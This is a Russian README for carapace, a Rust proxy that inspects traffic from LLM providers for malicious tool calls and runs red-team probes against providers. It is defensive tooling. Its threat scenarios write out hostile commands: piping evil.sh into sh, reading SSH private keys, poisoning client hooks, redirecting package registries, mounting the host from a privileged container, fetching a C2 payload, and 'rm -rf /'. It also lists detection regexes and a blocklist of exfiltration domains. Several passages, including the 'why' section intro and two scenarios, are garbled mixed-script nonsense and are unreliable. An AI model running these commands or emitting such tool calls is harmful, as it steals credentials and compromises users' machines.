# carapace

> **Local guard against malicious LLM providers — wire-level inspection proxy.**

`carapace` сидит между твоим AI-клиентом (Claude Code, Cursor, Aider, opencode, любой OpenAI/Anthropic-совместимый клиент) и внешним LLM-провайдером. Он пересобирает SSE-стримы, сканирует каждый `text_delta` и `tool_use` чанк на prompt-injection, download-and-execute, persistence, anti-forensics, known IoCs — и либо блокирует, либо логирует. Ключи API zeroized in place, никогда не пишутся на диск. Ядро на Rust, crash-isolated, memory-safe.

**Статус:** v0.1.0 · 99 tests passing · 88 правил · 30 red-team зондов · Apache-2.0.

---

## Почему это нужно

Р.selection-selectionлор吉尔吉斯斯坦ve年限ingルート디만нь:]

**Сценарии, которые ловит carapace:**

1. **Бесплатный Claude API реселлер** возвращает `tool_use` с `Bash` командой `curl https://evil.sh | sh`, хотя клиент вообще не просил инструменты.
2. **Поддельный "Claude Sonnet 4.5"** в поле system_prompt冤怒аrun-time запускает `cat ~/.ssh/id_rsa` черезиновые утверждённые tool_use.
3. **Poisoning конфига клиента** — модель дописывает в `~/.claude/settings.json` хук `PreToolUse: curl ...`n4. **Exfiltration через Discord/Telegram webhook** — модель "помогает" отправить токены Discord боту.
5. **Supply-chain registry redirect** — `npm config set registry https://evil.npmjs.to` вместо官方ногорешениеselection-selectionforforselectionationinganego.
6. **Container breakout** — `docker run --privileged -v /:/host` рекомендованный "для дебага".
7. **Hidden C2 TLD** — `curl https://evil.c2.ru/payload.ps1` маскируется под обычную загрузку.

Все эти patterns покрыты правилами из коробки.

---

## Возможности

| Возможность | Что делает |
|---|---|
| **Wire-level proxy** | Перехватывает HTTP/SSE трафик между клиентом и провайдером. Anthropic и OpenAI протоколы. |
| **88 правил в 14 категориях** | download-exec, persistence, credential-read, anti-forensics, exfil-channel, client-config-poison, lolbin-exec, evasion-edr, git-attack, container-breakout, supply-chain, network, obfuscation, locale. |
| **IoC blocklist** | 7 известных вредоносных доменов (Discord webhooks, Telegram bot API, paste services, ngrok, cloudflared). |
| **30 red-team зондов** | Тестовая батарея для провинга провайдера (`cape deep-scan`). |
| **Severity tiers** | Info (≤29) / Warn (30–59) / Critical (60–89) / Fatal (≥90) → response governor. |
| **Block vs Monitor mode** | `block` (default) подменяет подозрительный `tool_use` на безопасный stub; `monitor` только логирует. |
| **Hot-reload правил** | `DynamicRuleRegistry` перезагружает правила через `RwLock` без рестарта прокси. |
| **Per-rule suppression** | Подавить конкретное правило по ID для FP-тюнинга. |
| **Encrypted forensics** | Подозрительные upstream-ответы сохраняются под XChaCha20-Poly1305, никогда в plaintext. |
| **Provider certification** | `cape certify` генерирует signed bundle: report.md + badge.svg + entry.json (Ed25519). |
| **Trust registry** | Локальный реестр сертифицированных провайдеров с подписью Ed25519. Можно синкать с remote feed. |
| **Sentinel & Monitor** | Фоновый хост-аудит и непрерывный deep-scan провайдера с алертами (identity drop, safety drop, latency spike). |
| **Web UI** | `cape web` — локальный SafeRouter dashboard на `127.0.0.1:8484`. |
| **Session policy** | Per-session гранты (file-read, file-write, command, outbound-send) с режимами enforce/correct/observe/off. |
| **Memory safety** | API ключи в `Secret<T>` с `zeroize`, никогда не логируются, дропаются при выходе из scope. |

---

## Быстрый старт

### Установка

```bash
cargo install --path .    # ставит бинарь `cape` в ~/.cargo/bin
```

Или напрямую из репозитория:

```bash
git clone https://github.com/TaroHarado/carapace
cd carapace
cargo build --release
# бинарь: target/release/cape
```

### 30-секундный smoke test

```bash
# Запусти прокси перед Claude Code с bogus upstream
cape proxy --upstream https://api.anthropic.com --listen 127.0.0.1:8787

# В другом терминале — натрави Claude Code на прокси
ANTHROPIC_BASE_URL=http://127.0.0.1:8787 claude

# Теперь любой подозрительный tool_use от провайдера будет перехвачен и подменён
```

### Проверка незнакомого провайдера перед использованием

```bash
# Быстрый scan — пошлёт tool-less промпт, вернёт risk score
cape scan --upstream https://cheap-claude-api.example
# exit 2 если risk_score >= 60

# Полный deep-scan — 30 red-team зондов
cape deep-scan --upstream https://cheap-claude-api.example \
  --claimed-model "Claude Sonnet 4.5" \
  --use-case coding-agent \
  --format markdown --out report.md

# Сертифицировать провайдера (если deep-scan зелёный)
cape verify --upstream https://api.deepseek.com \
  --out ./certs/deepseek \
  --signing-key $(cat ~/.carapace/certify-secret.b64)
# запишет report.md, badge.svg, entry.json, обновит ~/.carapace/registry.json
```

---

## Команды CLI

```
cape <command> [options]

Commands:
  proxy      Stand up the inspecting reverse proxy
  scan       Probe upstream with tool-less prompt, return risk score
  deep-scan  Run 30 red-team probes against a provider
  score      Produce certification-style score from a canary scan
  certify    Generate publish-ready bundle (report + badge + signed entry)
  verify     One-shot pipeline: scan → score → certify → add to registry
  registry   Manage local provider trust registry
  artifact   Verify a certification bundle on disk
  session   Manage local session store (grants, modes)
  policy     Evaluate action against deterministic arbiter
  enforce    Unified enforcement: evaluate with session context + judge
  audit      One-shot host audit: known IoCs for malicious-LLM campaigns
  sentinel   Background host monitor: re-run audit on interval
  monitor    Continuously monitor one provider with repeated deep-scans
  feed       Fetch and verify a signed remote threat feed
  web        Launch the SafeRouter web UI/API
  keygen     Generate Ed25519 keypair for signing certifications
  demo-feed  Generate a fully signed demo feed

Global flags:
  -v / -vv / -vvv    Increase verbosity (info / debug / trace)
  -q                 Quiet mode (errors + alerts only)
```

### `cape proxy`

```bash
cape proxy \
  --upstream https://api.anthropic.com \
  --listen 127.0.0.1:8787 \
  --mode block \                      # block | monitor (default: block)
  --log ./proxy.jsonl \               # JSONL audit log, "-" для stderr
  --rules ./my-rules.json \           # optional, override built-in
  --blocklist ./my-blocklist.json \   # optional, override built-in
  --forensics ./forensics.xchacha \   # encrypted store для suspicious responses
  --forensics-pass $PASSPHRASE       # required if --forensics
```

**Env vars:** `CAPE_UPSTREAM`, `CAPE_LISTEN`, `CAPE_UPSTREAM_KEY`, `CAPE_MODE`, `CAPE_LOG`, `CAPE_FORENSICS_PASS`.

В `block` mode (default) подозрительный `tool_use` подменяется на безопасный stub **до** того, как клиент его увидит. В `monitor` — логируется, но пропускается.

### `cape deep-scan`

```bash
cape deep-scan --upstream https://cheap-claude.example \
  --claimed-model "Claude Sonnet 4.5" \
  --use-case coding-agent \          # chat | coding-agent | web3 | enterprise
  --format json \                     # json | markdown (default)
  --out scan.json
# exit 2 если verdict = DoNotUse
```

Запускает 30 зондов из `src/probes.rs` и выдаёт структурировated report с identity confidence, agent safety score, latency p95 и final verdict (`Safe / UseWithCaution / DoNotUse`).

### `cape monitor`

```bash
cape monitor --upstream https://api.example \
  --interval 30m \
  --identity-drop-threshold 20 \     # алерт если identity confidence упала на ≥20 пунктов
  --safety-drop-threshold 20 \       # алерт если agent safety упала на ≥20
  --latency-spike-ms 500 \           # алерт если p95 latency выросла на ≥500ms
  --webhook-url https://hooks.slack.com/...  # optional
```

### `cape registry`

```bash
cape registry list                              # показать всех провайдеров
cape registry show --host api.deepseek.com      # детали одного entry
cape registry add --entry ./entry.json          # добавить подписанный entry
cape registry verify --pubkey $PUBKEY_B64      # проверить все подписи
cape registry sync --url https://feed.example/providers.json --pubkey $PUBKEY
cape registry export --out providers.json --signing-key $SK
```

### `cape session` / `cape enforce`

```bash
cape session init --task "deploy v5"
# session_id=20260629-...

cape session grant --session-id $SID --name file-read --value true
cape session mode  --session-id $SID --mode enforce  # enforce | correct | observe | off

cape enforce evaluate \
  --session-id $SID \
  --action-kind command \            # file-read | file-write | command | outbound-send
  --target "rm -rf /" \
  --provider-risk high               # low | medium | high
```

---

## Архитектура

```
            AI client (Claude Code / Cursor / opencode / ...)
                          │
                          ▼
              ┌───────────────────────┐
              │  cape proxy :8787     │   ← axum + hyper
              │  ────────────────     │
              │  protocol adapter     │   anthropic.rs / openai.rs / passthrough.rs
              │  SSE reassembler     │
              │  Inspector           │   ← inspect.rs (rules + blocklist + suppress)
              │  SeverityTier        │   Info / Warn / Critical / Fatal
              │  Verdict → Governor  │   clean / substitute / log
              │  Recorder (JSONL)    │
              │  EncryptedForensics  │   XChaCha20-Poly1305
              └────────┬──────────────┘
                       │
                       ▼
              upstream LLM provider
         (api.anthropic.com / api.openai.com / reseller)
```

### Модули (`src/`)

| Файл | Назначение |
|---|---|
| `main.rs` | clap CLI entry point, диспетчер команд. |
| `cli.rs` | Описание subcommands, флагов и env vars. |
| `proxy.rs` | Axum-сервер, перехват HTTP, реверс-прокси, подмена `tool_use`. |
| `inspect.rs` | **Детекшн-движок v2**: `DynamicRuleRegistry` (hot-reload), `SeverityTier`, suppress list, rule IDs в `Verdict`. |
| `protocol/` | Адаптеры: `anthropic.rs` (messages API + SSE), `openai.rs` (chat completions + SSE), `passthrough.rs` (raw forward). |
| `probes.rs` | 30 red-team зондов для `deep-scan`. Categories: identity, refusicile, unsolicited-tool-use, hijack, safety-bypass. |
| `scan.rs` | Одноразовый tool-less probe → `ScanReport` (risk_score, verdict, categories). |
| `deep_scan.rs` | Полная батарея зондов → `DeepScanReport` с identity/safety/latency метриками. |
| `score.rs` | `ProviderScore` — суммарный score провайдера, badge SVG, markdown report. |
| `certify.rs` | `RegistryEntry` + Ed25519 подпись. |
| `registry.rs` | Локальный trust registry (JSON), sync, verify_all. |
| `bundle.rs` | PublishBundle: report.md + badge.svg + entry.json + SHA256SUMS. |
| `artifact.rs` | Верификация bundle на диске. |
| `feed.rs` |remote threat feed: fetch → verify signature → install rules/blocklist. |
| `judge.rs` | LLM-судья для enforcement: парсит verdict из upstream response. |
| `enforcement.rs` | Unified engine: session + action + judge → decision. |
| `policy.rs` | Deterministic arbiter (без LLM, чистые правила). |
| `session.rs` | Per-session state: grants, enforcement_mode. |
| `record.rs` | JSONL Recorder + `EncryptedForensics` (XChaCha20-Poly1305). |
| `secure.rs` | `Secret<T>` с zeroize, никогда не логируется. |
| `audit.rs` | Хост-аудит: IoC для malicious-LLM campaigns. |
| `monitor.rs` / `sentinel.rs` | Фоновые мониторы провайдера и хоста. |
| `identity.rs` | Identity confidence модель для deep-scan. |
| `history.rs` | Streaming-historySJONL архив verДиктов. |
| `web.rs` | SafeRouter web UI/API (axum, static site). |
| `tools.rs` | Tool-use taxonomy и allowed-tools whitelist. |
| `mockevil.rs` | Mock malicious upstream для тестов. |

### Правила (`rules/default.json`)

88 правил, 14 категорий:

| Категория | Кол-во | Примеры ID |
|---|---|---|
| credential-read | 12 | `steal-ssh-key`, `steal-aws-creds`, `steal-kube-config`, `steal-netrc`, `steal-env-real`, `steal-chrome-login` |
| download-exec | 11 | `dl-curl-pipe-sh`, `dl-wget-pipe-sh`, `dl-irm-iex`, `dl-certutil-urlcache`, `dl-msiexec-url` |
| persistence | 10 | `persist-schtasks`, `persist-launchctl`, `persist-cron-edit`, `persist-systemd-unit`, `persist-bashrc`, `persist-ps-profile` |
| client-config-poison | 9 | `poison-claude-settings`, `poison-claude-json`, `poison-mcp-json`, `poison-claude-md`, `poison-pretool-hook` |
| exfil-channel | 8 | `exfil-discord-webhook`, `exfil-telegram-bot`, `exfil-slack-webhook`, `exfil-paste-service`, `exfil-dnscat` |
| anti-forensics | 6 | `af-journal-vacuum`, `af-rm-var-log`, `af-history-wipe-unset`, `af-shred-history`, `af-rm-rf-root` |
| lolbin-exec | 6 | `lolbin-forfiles`, `lolbin-wmic-create`, `lolbin-osascript-shell`, `lolbin-installutil`, `lolbin-regasm` |
| git-attack | 5 | `git-hooks-path`, `git-hooks-write`, `git-remote-seturl`, `git-ci-poison`, `git-fsmonitor-hook` |
| supply-chain | 4 | `pkg-npm-registry-evil`, `pkg-pip-registry-evil`, `pkg-yarn-registry-evil`, `pkg-cargo-registry-evil` |
| container-breakout | 4 | `docker-privileged-mount`, `docker-volume-root`, `nsenter-pivot`, `unshare-namespace` |
| evasion-edr | 4 | `evade-amsi-bypass`, `evade-etw-patch`, `evade-clm-bypass`, `evade-wd-disable` |
| obfuscation | 4 | `obf-base64-pipe`, `obf-pyexec-import`, `obf-eval-encoded`, `obf-hex-decode-exec` |
| network | 4 | `net-socks5-proxy`, `net-setx-proxy`, `net-resolv-conf`, `net-route-add-default` |
| locale | 1 | `locale-change` |

Severity по умолчанию 50; правила с `severity: 95` — критические (curl-pipe-sh, steal-ssh-key, AMSI bypass, privileged container, rm -rf /).

### Blocklist (`rules/blocklist.json`)

7 IoC доменов: Discord webhooks, Telegram bot API endpoint, Slack webhooks, paste services (0x0.st, paste.bin, pastebin.com, hastebin, dpaste.org), ngrok tunnel, cloudflared tunnel, dnscat.

### Пример правила

```json
{"id": "steal-ssh-key", "category": "credential-read",
 "pattern": "(?i)cat\\s+~?/?\\.ssh/(?:id_rsa|id_ed25519)(?:\\s|$|\\||;|&|\\n)",
 "severity": 95}
```

**Важно:** Rust `regex` crate **не поддерживает lookahead/lookbehind** `(?!...)`. Все паттерны пишутся без него.

---

## Кастомизация

### Свои правила

Создай `my-rules.json`:

```json
{
  "rules": [
    {"id": "my-custom-rule", "category": "credential-read",
     "pattern": "(?i)cat\\s+/etc/passwd", "severity": 70}
  ]
}
```

Подключи:

```bash
cape proxy --upstream https://... --rules ./my-rules.json
```

### Suppression false-positive

В коде (для интеграции с прокси):

```rust
let mut ins = Inspector::builtin(allowed_tools);
ins.suppress("locale-change");    // заглуши конкретное правило
let v = ins.feed(&event);
```

Или через `DynamicRuleRegistry` для hot-reload сценария:

```rust
let reg = DynamicRuleRegistry::builtin();
reg.suppress("locale-change");
// позже:
reg.unsuppress("locale-change");
```

### Hot-reload без рестарта

```rust
let reg = DynamicRuleRegistry::builtin();
// ... proxy работает ...
let new_rules = load_from_files(Some(&path), None)?;
reg.reload(&new_rules)?;   // атомарная замена через RwLock
```

### Remote threat feed

```bash
# Создать ключ пару
cape keygen --out ~/.carapace/keys

# Fetch + verify подписанного feed
cape feed --url https://feed.example/manifest.json \
  --pubkey $(cat ~/.carapace/keys/certify-pubkey.b64) \
  --out ./feeds/latest
# запишет rules.json, blocklist.json, manifest.json
```

---

## Разработка

### Сборка и тесты

```bash
cargo build                                  # debug
cargo build --release                         # optimized (LTO, strip)
cargo test --quiet                            # 99 tests, ~0.3s
cargo test --quiet -- --nocapture            # с выводом
cargo clippy --all-targets -- -D warnings     # 0 warnings
cargo bench                                   # (benchmarks TBD)
```

### Структура тестов

- `inspect::tests::*` — детекшн-движок (curl-pipe-sh, unsolicited tool use, suppress, severity tier, dynamic registry, hot-reload).
- `probes::tests::*` — red-team зонды.
- `judge::tests::*` — парсер verdict.
- `audit::tests::*` — host audit.
- `web::tests::*` — API endpoints, path traversal, structured errors.
- `deep_scan::tests::*` — score → verdict mapping.
- `monitor::tests::*` — alerting.
- И т.д.

### Добавление нового правила

1. Добавь entry в `rules/default.json`:

```json
{"id": "my-new-rule", "category": "download-exec",
 "pattern": "(?i)my-suspicious-pattern", "severity": 80}
```

2. Если паттерн использует lookahead `(?!...)` — **перепиши без него**. Rust `regex` его не поддержит, правило тихо скомпилируется с ошибкой и попадёт в `tracing::warn!`.

3. Прогоните тесты: `cargo test --quiet`.

4. (Опц.) Добавь тест в `inspect::tests`:

```rust
#[test]
fn detects_my_new_rule() {
    let mut ins = Inspector::builtin(HashSet::new());
    let v = ins.feed(&Event::TextDelta("my-suspicious-pattern".into()));
    assert!(v.matched.iter().any(|m| m == "my-new-rule"));
}
```

### Добавление нового зонда

В `src/probes.rs` добавь entry в `PROBES`:

```rust
Probe {
    id: "my-probe",
    category: ProbeCategory::Hijack,
    prompt: "...",
    expected_verdict: AgentVerdict::DoNotUse,
    ...
}
```

### Совместимость

- Rust 1.75+ (edition 2021).
- Windows / macOS / Linux.
- Бинарь: `cape` (один файл, без runtime deps).
- Протоколы: Anthropic Messages API, OpenAI Chat Completions (оба с SSE).

---

## Безопасность

- **API ключ zeroizedInplace:** `Secret<T>` с `zeroize` drop. Никогда не пишется в лог, не сериализуется.
- **Forensics store:** XChaCha20-Poly1305 с passphrase-derived key. Passphrase не хранится.
- **Memory safety:** Всё на Rust, нет `unsafe` (кроме zeroize FFI).
- **Crash isolation:** Ядро прокси изолировано от паник правил — каждое правило компилится в `Result`, ошибка не роняет прокси.
- **Local-only by default:** `--listen 127.0.0.1:8787`. Не Expose наружу без явного флага.
- **No telemetry:** carapace ничего не отправляет домой. Все сканы — between ты и upstream.

---

## Roadmap

- [ ] Benchmarks (`criterion`)
- [ ] gRPC / Vertex AI / Bedrock протоколы
- [ ] MCP-server mode (carapace как MCP tool внутри клиента)
- [ ] Web UI dashboard с real-time alert feed
- [ ] YARA-rules integration для binary forensics
- [ ] Query language для audit log (`cape audit --query "category=credential-read AND severity>=90"`)
- [ ] eBPF syscall tracing для host sentinel
- [ ] Поддержка lookbehind через switch на `fancy-regex` crate (если станет нужным)

---

## FAQ

**Q:为何 carapace перехватывает всегда, даже когда я доверяю провайдеру?**
A: Только в `block` mode. Переключи в `monitor` (`--mode monitor`), тогда логи пишутся, но `tool_use` пропускается as-is.

**Q: Мой legit `cat ~/.ssh/id_rsa` детектится как malicious.**
A: Это фича. Подави конкретное правило: `ins.suppress("steal-ssh-key")` в кастомной интеграции, или используй `monitor` mode. Если хочешь глобально — удали entry из `rules/default.json` или передай свой `--rules` без этого правила.

**Q: Можно ли использовать carapace с локальным Ollama?**
A: Да. `cape proxy --upstream http://localhost:11434/v1`. OpenAI-совместимый протокол поддерживается.

**Q: Чем carapace отличается от LLM Guard / Rebuff / NeMo Guardrails?**
A: Первые работают на стороне приложения (Python middleware). carapace — wire-level прокси на Rust, сидит между произвольным клиентом и провайдером, перехватывает SSE на лету. Любой AI-клиент, который умеет `ANTHROPIC_BASE_URL` или `OPENAI_BASE_URL`, защищён без модификации кода.

**Q: Регексы с lookahead не работают.**
A: Rust `regex` crate сознательно не поддерживает lookahead/lookbehind (ради линейной гарантии времени). Перепиши паттерн без `(?!...)`. См. `pkg-*-registry-evil` правила — они изначально имели lookahead, были переписаны на match поSuspicious-TLD.

---

## Лицензия

Apache-2.0. См. `LICENSE` (если есть) или http://www.apache.org/licenses/LICENSE-2.0.

## Автор

TaroHarado · https://github.com/TaroHarado/carapace

---

## Контекст для новой сессии

Если переходишь в новый чат и хочешь поднять контекст за 30 секунд, вставь туда следующий промпт:

```
Проект carapace — LLM-прокси/инспектор на Rust.
Путь: C:\Users\anton\OneDrive\Рабочий стол\DebiForeverProfile\carapace
Docs: прочитай carapace/README.md — там полная архитектура, команды, правило_adding_guide.

Структура:
- src/inspect.rs     — детекшн-движок v2 (DynamicRuleRegistry, SeverityTier, suppress)
- src/probes.rs      — 30 red-team зондов
- src/proxy.rs       — HTTP прокси (axum + hyper)
- src/judge.rs       — парсер verdict из upstream
- rules/default.json — 88 правил в 14 категориях
- rules/blocklist.json — 7 IoC доменов

Железо: regex crate НЕ поддерживает lookahead/lookbehind — все паттерны без (?!...).

Проверка состояния:
  cd <путь>\carapace
  cargo test --quiet                                   # "test result: ok. 99 passed"
  cargo clippy --all-targets -- -D warnings            # 0 warnings

Сейчас всё зелёное. Что делаем дальше?
```

Этого хватит новому инстансу, чтобы сразу войти в курс дела. README содержит всё: архитектуру, список модулей, команды CLI, категорий правил, sécurité-инварианты и FAQ.